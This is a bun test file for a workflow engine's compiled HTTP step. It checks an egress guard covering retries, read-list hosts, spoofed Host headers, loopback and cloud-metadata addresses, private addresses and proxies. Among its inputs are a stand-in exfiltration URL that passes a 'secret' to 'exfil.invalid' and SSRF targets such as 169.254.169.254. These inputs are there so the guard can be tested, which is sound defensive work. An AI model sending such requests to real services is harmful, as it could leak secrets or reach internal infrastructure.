/**
 * #961: the vendored HTTP piece as the engine runs it -- its compiled
 * `dist/` -- carries the egress guard and sends a request that is not a read
 * once. `http-egress.test.ts` covers the guard itself; this proves the piece
 * is wired to it, so a vendor sync that dropped the patch would fail here.
 *
 * Needs the compiled piece. Like the other engine suites it skips without one,
 * and CI builds it because its bun test run sets `JARVIS_TEST_ENGINE_BUILD=1`.
 */
import { afterEach, beforeAll, describe, expect, test } from 'bun:test';
import { existsSync } from 'node:fs';
import { createRequire } from 'node:module';
import { resolve } from 'node:path';
import { ENGINE_BUILD_PATHS } from './build';
import { buildPiece } from './build-pieces';
import { EGRESS_POLICY_ENV, refusedBeforeSend, withReadHosts } from '../../runtime/http-egress';
import { closeWorkflowDb, initWorkflowDb } from '../../db';
import { createFlow } from '../../db/repos/flow';
import { assertVersionReady, configureWorkflowReadiness } from '../../db/repos/flow-readiness';
import { createDraftVersion, type FlowTriggerNode } from '../../db/repos/flow-version';
import { metadataToCatalogEntry, PieceCatalog } from '../../runtime/piece-catalog';

const pieceDir = resolve(ENGINE_BUILD_PATHS.VENDOR_PACKAGES, 'pieces/core/http');
const bundle = resolve(pieceDir, 'dist/src/index.js');
const buildOptIn = process.env.JARVIS_TEST_ENGINE_BUILD === '1';
const skip = !buildOptIn && !existsSync(bundle);
const require = createRequire(import.meta.url);

type Run = (context: { propsValue: Record<string, unknown> }) => Promise<unknown>;
let run: Run;
const dns = require('node:dns') as { lookup: (...args: unknown[]) => void };
const realLookup = dns.lookup;
let lookups: string[] = [];

describe.skipIf(skip)('the compiled core HTTP piece', () => {
  beforeAll(async () => {
    if (buildOptIn) await buildPiece(pieceDir);
    const mod = require(bundle) as { http: { getAction(name: string): { run: Run } | undefined } };
    run = mod.http.getAction('send_request')!.run;
  });
  afterEach(() => {
    dns.lookup = realLookup;
    delete process.env[EGRESS_POLICY_ENV];
  });

  // A name that resolves nowhere: every attempt costs exactly one lookup, and
  // nothing is ever sent, so the count is the number of attempts.
  const failingLookup = () => {
    lookups = [];
    dns.lookup = ((host: string, _opts: unknown, cb: (e: Error) => void) => {
      lookups.push(host);
      cb(Object.assign(new Error(`getaddrinfo ENOTFOUND ${host}`), { code: 'ENOTFOUND' }));
    }) as never;
  };
  const props = (method: string, extra: Record<string, unknown> = {}) => ({ method, url: 'http://ops.invalid/logs', headers: {},
    // The piece's own timeout (seconds): a regressed guard fails fast instead of waiting on an unroutable address.
    queryParams: {}, authType: 'NONE', body_type: 'none', failureMode: 'retry_all', timeout: 3, ...extra });

  test('a request that is not a read is sent once, even with "Retry on all errors"; a read is tried three times', async () => {
    failingLookup();
    await expect(run({ propsValue: props('POST') })).rejects.toBeDefined();
    expect(lookups).toEqual(['ops.invalid']);
    for (const method of ['PUT', 'PATCH', 'DELETE']) {
      failingLookup();
      await expect(run({ propsValue: props(method) })).rejects.toBeDefined();
      expect(`${method}: ${lookups.length}`).toBe(`${method}: 1`);
    }
    failingLookup();
    await expect(run({ propsValue: props('GET') })).rejects.toBeDefined();
    expect(lookups).toEqual(['ops.invalid', 'ops.invalid', 'ops.invalid']);
  });

  test('#1153: a read run inside the engine\'s read list is held to it, though the piece bundle has its own copy of the guard', async () => {
    // `withReadHosts` here is the source module, a different copy from the
    // one compiled into the piece, as the engine bundle's is in production.
    failingLookup();
    await expect(withReadHosts(['listed.invalid'], () => run({ propsValue: props('GET', { url: 'http://exfil.invalid/c?d=secret' }) })))
      .rejects.toThrow(/not on this flow's read list/);
    expect(lookups).toEqual([]);
    await expect(withReadHosts(['listed.invalid'], () => run({ propsValue: props('GET', { url: 'http://listed.invalid/x', headers: { Host: 'other-tenant.example' } }) })))
      .rejects.toThrow(/may not set its own Host header/);
    expect(lookups).toEqual([]);
    // Listed, it goes on to the lookup (which fails here).
    await expect(withReadHosts(['listed.invalid'], () => run({ propsValue: props('GET', { url: 'http://listed.invalid/x' }) }))).rejects.toBeDefined();
    expect(lookups[0]).toBe('listed.invalid');
  });

  test('#1153: a refusal on a retry follows an attempt that may have reached the server, so it does not read as not sent', async () => {
    lookups = [];
    dns.lookup = ((host: string, _opts: unknown, cb: (e: Error | null, a?: unknown) => void) => {
      lookups.push(host);
      // First attempt: an error after which the piece tries again; then the name turns inward.
      if (lookups.length === 1) cb(Object.assign(new Error(`connect ECONNRESET ${host}`), { code: 'ECONNRESET' }));
      else cb(null, [{ address: '127.0.0.1', family: 4 }]);
    }) as never;
    const refused = await run({ propsValue: props('GET') }).catch((error: unknown) => error);
    expect(String((refused as Error).message)).toMatch(/refused/);
    expect(lookups.length).toBe(2);
    expect(refusedBeforeSend(refused)).toBe(false);
  });

  test('loopback and metadata are refused by name or literal, under either policy, and a refusal is not retried', async () => {
    for (const policy of [undefined, 'private-allowed']) {
      if (policy) process.env[EGRESS_POLICY_ENV] = policy; else delete process.env[EGRESS_POLICY_ENV];
      for (const url of ['http://localhost:9/x', 'http://127.0.0.1:9/x', 'http://169.254.169.254/latest/meta-data/', 'http://[::1]:9/x']) {
        await expect(run({ propsValue: props('GET', { url }) })).rejects.toThrow(/refused/);
      }
    }
  });

  test('a private address is refused on a hosted engine, which is what an engine told nothing is', async () => {
    lookups = [];
    dns.lookup = ((host: string, _opts: unknown, cb: (e: null, a: unknown) => void) => {
      lookups.push(host);
      cb(null, [{ address: '10.20.30.40', family: 4 }]);
    }) as never;
    await expect(run({ propsValue: props('GET', { url: 'http://nas.internal/status' }) })).rejects.toThrow(/reach only public addresses/);
    // Refused once, not retried.
    expect(lookups).toEqual(['nas.internal']);
  });

  test('a plain GET with only a method and a URL is ready, and runs without headers or query params', async () => {
    const mod = require(bundle) as { http: { getAction(name: string): { props: Record<string, { required?: boolean }> } | undefined } };
    const sendRequest = mod.http.getAction('send_request')!;
    expect(sendRequest.props.headers!.required).toBe(false);
    expect(sendRequest.props.queryParams!.required).toBe(false);
    initWorkflowDb(':memory:');
    try {
      configureWorkflowReadiness({ pieces: new PieceCatalog([metadataToCatalogEntry({
        name: '@activepieces/piece-http', displayName: 'HTTP', description: '',
        actions: { send_request: { name: 'send_request', displayName: 'Send HTTP request', description: '', props: sendRequest.props } },
      })]) });
      const flow = createFlow();
      const version = createDraftVersion({ flowId: flow.id, displayName: 'get', trigger: { name: 'trigger', type: 'EMPTY', settings: {}, nextAction: {
        name: 'step_1', type: 'PIECE',
        settings: { pieceName: '@activepieces/piece-http', actionName: 'send_request', input: { method: 'GET', url: 'https://api.example.com/items', authType: 'NONE' } },
      } } as FlowTriggerNode });
      expect(() => assertVersionReady(flow.id, version.id)).not.toThrow();
    } finally { closeWorkflowDb(); }
    failingLookup();
    const { headers: _h, queryParams: _q, ...bare } = props('GET');
    const failure = await run({ propsValue: bare }).catch((error: unknown) => error);
    expect(lookups.length).toBeGreaterThan(0);
    expect(String((failure as Error).message)).not.toMatch(/undefined|TypeError/);
  });

  test('a proxy is refused rather than used without the check', async () => {
    await expect(run({ propsValue: props('GET', { use_proxy: true, proxy_settings: { proxy_host: '127.0.0.1', proxy_port: 3128 } }) }))
      .rejects.toThrow(/does not send HTTP steps through a proxy/);
    // As a refusal before sending, so a tracked send is recorded as not sent (#1153).
    const refused = await run({ propsValue: props('POST', { use_proxy: true, proxy_settings: { proxy_host: '127.0.0.1', proxy_port: 3128 } }) }).catch((error: unknown) => error);
    expect(refusedBeforeSend(refused)).toBe(true);
  });
});
